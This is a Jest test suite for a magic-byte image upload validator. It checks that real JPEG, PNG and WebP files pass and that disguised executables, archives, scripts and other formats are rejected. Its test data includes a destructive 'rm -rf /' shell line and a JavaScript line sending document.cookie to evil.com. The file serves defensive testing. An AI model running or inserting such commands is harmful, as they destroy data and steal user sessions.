/**
 * Tests for magic byte validation in image-handler
 *
 * Security test suite for Task 1.5: Validate File Magic Bytes on Upload
 * These tests verify that malicious files disguised as images are rejected
 */

import { validateImageMagicBytes } from '../src/utils/image-handler';

describe('validateImageMagicBytes', () => {
  describe('Valid image files', () => {
    it('should accept valid JPEG files', async () => {
      // JPEG magic bytes: FF D8 FF
      const jpegBuffer = Buffer.from([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
        0x00, 0x01, 0x00, 0x00
      ]);

      const result = await validateImageMagicBytes(jpegBuffer, 'photo.jpg');

      expect(result.valid).toBe(true);
      expect(result.mimeType).toBe('image/jpeg');
      expect(result.error).toBeUndefined();
    });

    it('should accept valid PNG files', async () => {
      // PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
      const pngBuffer = Buffer.from([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53
      ]);

      const result = await validateImageMagicBytes(pngBuffer, 'photo.png');

      expect(result.valid).toBe(true);
      expect(result.mimeType).toBe('image/png');
      expect(result.error).toBeUndefined();
    });

    it('should accept valid WebP files', async () => {
      // WebP magic bytes: RIFF....WEBP
      const webpBuffer = Buffer.from([
        0x52, 0x49, 0x46, 0x46, // RIFF
        0x24, 0x00, 0x00, 0x00, // file size
        0x57, 0x45, 0x42, 0x50, // WEBP
        0x56, 0x50, 0x38, 0x20, // VP8 space
        0x18, 0x00, 0x00, 0x00,
        0x30, 0x01, 0x00, 0x9D,
        0x01, 0x2A, 0x01, 0x00,
        0x01, 0x00, 0x02, 0x00,
        0x34, 0x25, 0xA4, 0x00,
        0x03, 0x70, 0x00, 0xFE
      ]);

      const result = await validateImageMagicBytes(webpBuffer, 'photo.webp');

      expect(result.valid).toBe(true);
      expect(result.mimeType).toBe('image/webp');
      expect(result.error).toBeUndefined();
    });
  });

  describe('Malicious files disguised as images', () => {
    it('should reject executable files with .jpg extension', async () => {
      // PE executable magic bytes: MZ (4D 5A)
      const exeBuffer = Buffer.from([
        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
        0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
      ]);

      const result = await validateImageMagicBytes(exeBuffer, 'malicious.jpg');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
      expect(result.error).toContain('not an allowed image type');
    });

    it('should reject ZIP files disguised as images', async () => {
      // ZIP magic bytes: 50 4B 03 04
      const zipBuffer = Buffer.from([
        0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00,
        0x08, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
      ]);

      const result = await validateImageMagicBytes(zipBuffer, 'payload.png');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject PDF files disguised as images', async () => {
      // PDF magic bytes: %PDF
      const pdfBuffer = Buffer.from([
        0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34,
        0x0A, 0x25, 0xE2, 0xE3, 0xCF, 0xD3, 0x0A, 0x0A
      ]);

      const result = await validateImageMagicBytes(pdfBuffer, 'document.jpg');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject shell scripts disguised as images', async () => {
      // Shell script magic: #!/bin/bash
      const scriptBuffer = Buffer.from('#!/bin/bash\nrm -rf /\n', 'utf-8');

      const result = await validateImageMagicBytes(scriptBuffer, 'script.png');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject ELF executables disguised as images', async () => {
      // ELF magic bytes: 7F 45 4C 46
      const elfBuffer = Buffer.from([
        0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x03, 0x00, 0x3E, 0x00, 0x01, 0x00, 0x00, 0x00
      ]);

      const result = await validateImageMagicBytes(elfBuffer, 'binary.webp');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });
  });

  describe('Text files disguised as images', () => {
    it('should reject plain text files with image extension', async () => {
      const textBuffer = Buffer.from('This is a plain text file pretending to be an image.');

      const result = await validateImageMagicBytes(textBuffer, 'text.jpg');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject HTML files disguised as images', async () => {
      const htmlBuffer = Buffer.from('<!DOCTYPE html><html><body>Malicious content</body></html>');

      const result = await validateImageMagicBytes(htmlBuffer, 'page.png');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject JSON files disguised as images', async () => {
      const jsonBuffer = Buffer.from('{"malicious": "payload", "data": [1,2,3]}');

      const result = await validateImageMagicBytes(jsonBuffer, 'config.jpg');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject JavaScript files disguised as images', async () => {
      const jsBuffer = Buffer.from('alert("XSS attack");\nfetch("http://evil.com/steal?cookie="+document.cookie);');

      const result = await validateImageMagicBytes(jsBuffer, 'exploit.png');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });
  });

  describe('Unknown and empty files', () => {
    it('should reject empty files', async () => {
      const emptyBuffer = Buffer.from([]);

      const result = await validateImageMagicBytes(emptyBuffer, 'empty.jpg');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject files with random bytes that match no known type', async () => {
      const randomBuffer = Buffer.from([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]);

      const result = await validateImageMagicBytes(randomBuffer, 'random.jpg');

      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });
  });

  describe('Extension mismatch handling', () => {
    it('should accept JPEG with .png extension (warns but accepts)', async () => {
      // Valid JPEG but with .png extension
      const jpegBuffer = Buffer.from([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
        0x00, 0x01, 0x00, 0x00
      ]);

      const result = await validateImageMagicBytes(jpegBuffer, 'photo.png');

      // Should still accept - extension mismatch is just a warning
      expect(result.valid).toBe(true);
      expect(result.mimeType).toBe('image/jpeg');
    });

    it('should accept PNG with .jpg extension (warns but accepts)', async () => {
      // Valid PNG but with .jpg extension
      const pngBuffer = Buffer.from([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
        0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
        0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
        0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53
      ]);

      const result = await validateImageMagicBytes(pngBuffer, 'image.jpg');

      // Should still accept - extension mismatch is just a warning
      expect(result.valid).toBe(true);
      expect(result.mimeType).toBe('image/png');
    });

    it('should accept files with no extension', async () => {
      const jpegBuffer = Buffer.from([
        0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46,
        0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
        0x00, 0x01, 0x00, 0x00
      ]);

      const result = await validateImageMagicBytes(jpegBuffer, 'noextension');

      expect(result.valid).toBe(true);
      expect(result.mimeType).toBe('image/jpeg');
    });
  });

  describe('Disallowed image types', () => {
    it('should reject GIF files', async () => {
      // GIF magic bytes: GIF89a
      const gifBuffer = Buffer.from([
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
        0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00
      ]);

      const result = await validateImageMagicBytes(gifBuffer, 'animation.gif');

      expect(result.valid).toBe(false);
      expect(result.mimeType).toBe('image/gif');
      expect(result.error).toContain('not an allowed image type');
    });

    it('should reject BMP files', async () => {
      // BMP magic bytes: BM
      const bmpBuffer = Buffer.from([
        0x42, 0x4D, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x28, 0x00,
        0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00
      ]);

      const result = await validateImageMagicBytes(bmpBuffer, 'image.bmp');

      expect(result.valid).toBe(false);
      expect(result.error).toContain('not an allowed image type');
    });

    it('should reject TIFF files', async () => {
      // TIFF magic bytes (little endian): II + 42 with proper IFD structure
      // A more complete TIFF header that file-type can detect
      const tiffBuffer = Buffer.from([
        0x49, 0x49, 0x2A, 0x00, // II + 42 (little endian TIFF)
        0x08, 0x00, 0x00, 0x00, // Offset to first IFD
        0x01, 0x00,             // Number of directory entries (1)
        0x00, 0x01,             // Tag: ImageWidth
        0x03, 0x00,             // Type: SHORT
        0x01, 0x00, 0x00, 0x00, // Count: 1
        0x01, 0x00, 0x00, 0x00, // Value: 1
        0x00, 0x00, 0x00, 0x00, // Next IFD offset (none)
      ]);

      const result = await validateImageMagicBytes(tiffBuffer, 'image.tiff');

      // TIFF should be rejected (either as undetected or as disallowed type)
      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject ICO files', async () => {
      // ICO magic bytes: 00 00 01 00
      const icoBuffer = Buffer.from([
        0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x10, 0x10,
        0x00, 0x00, 0x01, 0x00, 0x04, 0x00, 0x28, 0x01,
        0x00, 0x00, 0x16, 0x00, 0x00, 0x00
      ]);

      const result = await validateImageMagicBytes(icoBuffer, 'icon.ico');

      expect(result.valid).toBe(false);
      expect(result.error).toContain('not an allowed image type');
    });
  });
});
